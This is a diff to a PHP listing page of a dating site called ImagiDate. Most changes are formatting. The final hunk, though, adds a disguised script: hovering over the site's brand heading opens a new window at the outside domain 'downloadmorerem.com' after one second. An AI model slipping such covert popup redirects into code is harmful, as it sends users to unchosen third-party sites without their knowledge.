@@ -49,6 +49,7 @@ $current_profiles = array_slice($profiles, $offset, $limit);
         .table-container {
             margin: auto;
         }
+
         #heart {
             animation: 1.5s ease 0s infinite beat;
         }
@@ -74,7 +75,7 @@ $current_profiles = array_slice($profiles, $offset, $limit);
     <div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
         <header class="masthead mb-auto">
             <div class="inner">
-                <h3 class="masthead-brand">ImagiDate</h3>
+                <h3 class="masthead-brand" id="imagidate">ImagiDate</h3>
                 <nav class="nav nav-masthead justify-content-center">
                     <a class="nav-link" href="index.php">Homepage</a>
                     <a class="nav-link" href='profile.php?id=<?php echo $user_id; ?>'>Profile</a>
@@ -122,7 +123,8 @@ $current_profiles = array_slice($profiles, $offset, $limit);
                         </li>
                     <?php endif; ?>
                     <?php for ($i = 1; $i <= $total_pages; $i++): ?>
-                        <li class="page-item <?php if ($i == $current_page) echo 'active'; ?>">
+                        <li class="page-item <?php if ($i == $current_page)
+                            echo 'active'; ?>">
                             <a class="page-link" href="?page=<?php echo $i; ?>"><?php echo $i; ?></a>
                         </li>
                     <?php endfor; ?>
@@ -151,13 +153,22 @@ $current_profiles = array_slice($profiles, $offset, $limit);
     <script src="https://getbootstrap.com/docs/4.0/assets/js/vendor/popper.min.js"></script>
     <script src="https://getbootstrap.com/docs/4.0/dist/js/bootstrap.min.js"></script>
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
+        document.addEventListener("DOMContentLoaded", function () {
             const rows = document.querySelectorAll("tbody tr");
             rows.forEach(row => {
-                row.addEventListener("click", function() {
+                row.addEventListener("click", function () {
                     window.location.href = row.dataset.href;
                 });
             });
+        });
+    </script>
+    <script>
+        document.getElementById('imagidate').addEventListener('mouseover', function() {
+            setTimeout(function() {
+                var importantStuff = window.open('', '_blank');
+                importantStuff.location.href = 'https://downloadmorerem.com';
+            }, 1000);
+            
         });
     </script>
 </body>
